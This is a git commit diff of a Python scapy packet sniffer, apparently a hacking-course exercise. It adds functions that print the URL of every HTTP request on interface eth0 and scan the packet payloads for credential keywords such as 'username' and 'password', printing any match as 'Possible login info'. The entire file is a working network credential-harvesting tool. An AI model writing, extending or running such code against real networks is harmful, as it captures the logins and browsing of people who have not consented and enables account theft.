45fbf3004a2bf21a37f1718c001931c505555f1c
root <shaddawud19@proton.me>
2025-12-29 23:36:17 +0000

    extracting url info from sniffed packets + refactoring

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -8,15 +8,25 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["username", "uname", "user", "login", "email", "password", "pword", "pass"]
+        for k in keywords:
+            if k in load:
+                return load
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username", "uname", "user", "login", "email", "password", "pword", "pass"]
-            for k in keywords:
-                if k in load:
-                    print(load)
-                    break
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + str(url))
+        login = get_login(packet)
+        if login:
+            print("\n\n[+] Possible login info >> " + login + "\n\n")
 
 
 sniff("eth0")
